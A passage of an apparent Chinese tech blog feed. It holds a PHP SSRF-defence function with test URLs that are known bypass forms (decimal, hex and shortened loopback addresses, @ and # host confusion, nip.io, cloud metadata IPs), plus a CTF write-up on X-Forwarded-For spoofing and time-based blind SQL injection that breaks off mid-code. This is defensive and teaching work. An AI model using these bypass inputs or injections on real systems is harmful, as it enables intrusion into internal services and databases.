class="hljs-built_in">print</span> <span class="hljs-string">&quot;failed&quot;</span><br>    <span class="hljs-keyword">return</span> cmp<br><br>f_100 = set_passline(<span class="hljs-number">60</span>)<br><span class="hljs-built_in">print</span> f_100.__closure__<br>f_100(<span class="hljs-number">89</span>)<br></code></pre></div></td></tr></table></figure><p>传递的是整数对象。</p></li><li><p>在<code>def mysum(x, y):</code>上边加<code>@foo</code>，是Python提供的语法。表示<code>mysum</code>这个函数对象作为<code>func</code>参数传递给<code>foo(func)</code>函数，再把<code>foo</code>函数返回的新函数对象赋给<code>mysum</code>。</p></li><li><p>建议给装饰器里的<code>wrapper</code>加上<code>@functools.wraps(func)</code>装饰器。不加的时候<code>mysum.__name__</code>的值是<code>wrapper</code>，加上去值才是<code>mysum</code>。</p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP开发中防御SSRF</title>
    <link href="/2017/01/05/php-ssrf-protection/"/>
    <url>/2017/01/05/php-ssrf-protection/</url>
    
    <content type="html"><![CDATA[<p>参考phith0n的<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">谈一谈如何在Python开发中拒绝SSRF漏洞</a>，用PHP写一个检测是否是内网URL的函数。</p><p>需要注意的是，我写的这个检测URL的函数并没有考虑到客户端允许重定向跟踪的情况。如果允许重定向跟踪则需要检查每个30x响应包的location字段。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*  判断是否合法的URL，合法则返回true；</span><br><span class="hljs-comment">*  格式不是http/https协议，或是内网IP，则视为不合法</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  注意：判断是否是内网url的时候并没有检测30X跳转的location响应头部，</span><br><span class="hljs-comment">*  使用此方法时，要求curl或其他工具设置不允许重定向跟踪</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  <span class="hljs-doctag">@author</span> Ovie</span><br><span class="hljs-comment">*  <span class="hljs-doctag">@param</span> string $url</span><br><span class="hljs-comment">*  <span class="hljs-doctag">@return</span> bool</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_allowed_URL</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;<br>    <span class="hljs-comment">//可用来防止HTTP头注入</span><br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span> || !<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br>  <br>  <span class="hljs-comment">//仅允许http或https协议</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^https?:\/\/.*$/&#x27;</span>, <span class="hljs-variable">$url</span>))&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_HOST);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$host</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$host</span>);<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-literal">false</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$is_inner_ipaddress</span> = <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$ip</span> &gt;&gt; <span class="hljs-number">24</span> <span class="hljs-keyword">or</span> <br><span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$ip</span> &gt;&gt; <span class="hljs-number">24</span> <span class="hljs-keyword">or</span> <br><span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">20</span> == <span class="hljs-variable">$ip</span> &gt;&gt; <span class="hljs-number">20</span> <span class="hljs-keyword">or</span> <br><span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">16</span> == <span class="hljs-variable">$ip</span> &gt;&gt; <span class="hljs-number">16</span> ;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$is_inner_ipaddress</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">is_allowed_URL</span>(<span class="hljs-variable">$url</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>说下上面的用到的两个PHP函数:<code>parse_url()</code>和<code>gethostbyname()</code>。</p><ol><li><p>PHP解析URL的host：</p><p><code>parse_url()</code>函数不是用来验证给定 URL 的合法性的，只是将其分解为几部分。不完整的 URL 也被接受，<code>parse_url()</code>会尝试尽量正确地将其解析。</p><p>参考：<a href="http://php.net/manual/zh/function.parse-url.php">http://php.net/manual/zh/function.parse-url.php</a></p></li><li><p>PHP解析URL的IP：</p><p><code>gethostbyname($hostname)</code>函数会返回IPv4地址，解析失败的话就会返回没被修改过的<code>$hostname</code>。</p><p>参考：<a href="http://php.net/manual/zh/function.gethostbyname.php">http://php.net/manual/zh/function.gethostbyname.php</a></p></li></ol><hr><p>（以下内容于2021年1月25日添加）</p><p>之前的代码早有绕过方式，且有个大的错误，就是在给<code>$is_inner_ipaddress</code>变量赋值的时候用了<code>or</code>，而不是<code>||</code>，导致<code>192.168.0.1</code>这些内网ip其实是没被检测到的，原因是<code>or</code>的优先级比赋值符<code>=</code>的小，<code>||</code>的优先级才比<code>=</code>的大（参考：<a href="https://stackoverflow.com/questions/5998309/logical-operators-or-or/5998330#5998330）。">https://stackoverflow.com/questions/5998309/logical-operators-or-or/5998330#5998330）。</a></p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">*  判断是否合法的URL，合法则返回true</span><br><span class="hljs-comment">*  不合法的情况：</span><br><span class="hljs-comment">*  1. 包含非ASCII码字符</span><br><span class="hljs-comment">*  2. 不是http或https协议</span><br><span class="hljs-comment">*  3. ipv6地址（不支持ipv6地址，将判断为不合法）</span><br><span class="hljs-comment">*  4. URL的user、pass、host，fragment段包含@、\或其它字符</span><br><span class="hljs-comment">*  5. 请求地址为内网IP：192.168.0.0/16，10.0.0.0/8，172.16.0.0/12，127.0.0.1/8</span><br><span class="hljs-comment">*  6. 请求地址为169.254.169.254，100.100.100.200，192.0.0.192这几个常见云主机metadata地址ip</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  注意，该方法未考虑到：</span><br><span class="hljs-comment">*  1. 30X跳转的location响应头部是否为合法URL</span><br><span class="hljs-comment">*  2. DNS Rebinding攻击</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">*  <span class="hljs-doctag">@author</span> Ovie</span><br><span class="hljs-comment">*  <span class="hljs-doctag">@param</span> string $url</span><br><span class="hljs-comment">*  <span class="hljs-doctag">@return</span> bool</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_allowed_URL</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// Only allow ASCII URL (so will forbid CRLF and other Unicode char)</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span> || !<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// Only allow http and https scheme</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^https?:\/\/.*$/&#x27;</span>, <span class="hljs-variable">$url</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$parts</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;pass&quot;</span>, <span class="hljs-string">&quot;host&quot;</span>, <span class="hljs-string">&quot;fragment&quot;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$parts</span>[<span class="hljs-variable">$key</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;~[:/?#\\\\@]~&quot;</span>, <span class="hljs-variable">$parts</span>[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// gethostbyname do not support ipv6</span><br>    <span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$parts</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ip</span> === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br><br>    <span class="hljs-variable">$is_inner_ipaddress</span> = <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$ip</span> &gt;&gt; <span class="hljs-number">24</span> ||<br>    <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-variable">$ip</span> &gt;&gt; <span class="hljs-number">24</span> ||<br>    <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;172.16.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">20</span> == <span class="hljs-variable">$ip</span> &gt;&gt; <span class="hljs-number">20</span> ||<br>    <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.168.0.0&#x27;</span>) &gt;&gt; <span class="hljs-number">16</span> == <span class="hljs-variable">$ip</span> &gt;&gt; <span class="hljs-number">16</span> ||<br>    <span class="hljs-variable">$ip</span> == <span class="hljs-number">0</span> ||<br>    <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;169.254.169.254&#x27;</span>) == <span class="hljs-variable">$ip</span> ||<br>    <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;192.0.0.192&#x27;</span>) == <span class="hljs-variable">$ip</span> ||<br>    <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;100.100.100.200&#x27;</span>) == <span class="hljs-variable">$ip</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$is_inner_ipaddress</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="hljs-comment">$url = $_GET[&#x27;url&#x27;];</span><br><span class="hljs-comment">var_dump(is_allowed_URL($url));</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">is_allowed_URL</span>(<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span> . <span class="hljs-string">&quot; : &quot;</span> . (<span class="hljs-variable">$res</span> ? <span class="hljs-variable">$res</span> : <span class="hljs-string">&quot;false&quot;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><br><br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.0.0.1:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://169.254.169.254:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://192.0.0.192:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://100.100.100.200:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.0.0.1:8080\@baidu.com/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://baidu.com#@127.0.0.1:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.1:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.0.0.1.:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://2130706433:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://0:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://[::]:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://localhost:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://0:0:0:0:0:ffff:127.0.0.1:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.0000.000000.000001:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.0.0.1:8080#@baidu.com/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;http://[::1]/&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://0.0.0.0:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.2.0.2:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://0x7f.0x0.0x0.0x1:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://baidu.com.127.0.0.1.nip.io:8080/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://baidu.com@127.0.0.1:8080@baidu.com/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.0.0.1:8080\.baidu.com/ppppp&quot;</span>);<br><span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">&quot;https://127.0.0.1:8080:443/ppppp&quot;</span>);<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>在<code>php 7.2</code>下运行的结果：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">169.254</span>.<span class="hljs-number">169.254</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">192.0</span>.<span class="hljs-number">0.192</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">100.100</span>.<span class="hljs-number">100.200</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>\@baidu.com/ppppp : false<br>https:<span class="hljs-regexp">//</span>baidu.com<span class="hljs-comment">#@127.0.0.1:8080/ppppp : false</span><br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.1</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>.:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">2130706433</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span>[::]:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">0</span>:ffff:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0000</span>.<span class="hljs-number">000000.000001</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span><span class="hljs-comment">#@baidu.com/ppppp : false</span><br>http:<span class="hljs-regexp">//</span>[::<span class="hljs-number">1</span>]/ : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.2</span>.<span class="hljs-number">0.2</span>:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>x7f.<span class="hljs-number">0</span>x0.<span class="hljs-number">0</span>x0.<span class="hljs-number">0</span>x1:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span>baidu.com.<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>.nip.io:<span class="hljs-number">8080</span>/ppppp : false<br>https:<span class="hljs-regexp">//</span>baidu.com@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>@baidu.com/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>\.baidu.com/ppppp : false<br>https:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>:<span class="hljs-number">443</span>/ppppp : false<br></code></pre></div></td></tr></table></figure><p>这份验证代码有些繁琐，不同场景下可能需要做点调整。如有什么问题，请指出~</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实验吧CTF - Who are you</title>
    <link href="/2016/08/30/ctf-who-are-you/"/>
    <url>/2016/08/30/ctf-who-are-you/</url>
    
    <content type="html"><![CDATA[<h2 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you"></a>Who are you</h2><p><a href="http://www.shiyanbar.com/ctf/1941">http://www.shiyanbar.com/ctf/1941</a></p><p>题目：</p><blockquote><p>我要把攻击我的人都记录db中去!</p><p>格式ctf{}</p></blockquote><p>解题：</p><p>访问链接，页面显示<code>your IP is XX.XX.XX.XX</code>，知道这是一个关于IP伪造。</p><p>尝试各种伪造IP的HTTP头：</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">X-Forwarded-For<br><span class="hljs-symbol">Client</span>-<span class="hljs-built_in">IP</span><br>x-remote-<span class="hljs-built_in">IP</span><br>x-originating-<span class="hljs-built_in">IP</span><br>x-remote-addr<br></code></pre></div></td></tr></table></figure><p>发现X-Forwarded-For可以伪造。</p><p><img src="ctf_who_are_you_1.png" alt="ctf_who_are_you_1.png"></p><p>题目说：</p><blockquote><p>我要把攻击我的人都记录db中去!</p></blockquote><p>可以猜测这是一个INSERT INTO的注入。</p><p>尝试各种注入，发现注入的语句给原封不动地显示在页面中，但，如果注入的语句有逗号，则后面的内容就不会显示在页面中。 </p><p><img src="ctf_who_are_you_2.png" alt="ctf_who_are_you_2.png"></p><p>所以，猜测逗号后面的内容给截掉了。</p><p>入了一个坑，导致想不到怎么注入：</p><p>一直觉得后台程序的逻辑是这样的：取X-Forwarded-For的内容，去掉逗号后的内容，再拼接INSERT INTO的SQL语句，写到数据库中，再用SELECT语句从数据库取出（那程序怎么确定现在取回的值就是刚刚插入的值呢？显然这不能保证。），显示在页面中。</p><p>入了这个坑，就觉得注入的语句没有逃脱单引号的包围，注入的X-Forwarded-For内容被原封不动地写进了数据库中。</p><p>看了Writeup之后才知道这是time-based盲注。</p><p>所以想后台程序的逻辑差不多是这样：取X-Forwarded-For的值，去掉逗号后的内容，剩下的存在一个变量里，假设变量名是tmp，然后再拼接到INSERT INTO语句中，执行SQL语句。最后再把tmp的内容显示在页面中。</p><p>后台代码可能是这样：</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIp</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]))&#123;<br>      <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<br>&#125;<br>   <span class="hljs-variable">$ip_arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$ip</span>);<br>   <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip_arr</span>[<span class="hljs-number">0</span>];<br>&#125;<br> <br><span class="hljs-variable">$host</span>=<span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$user</span>=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-variable">$db</span>=<span 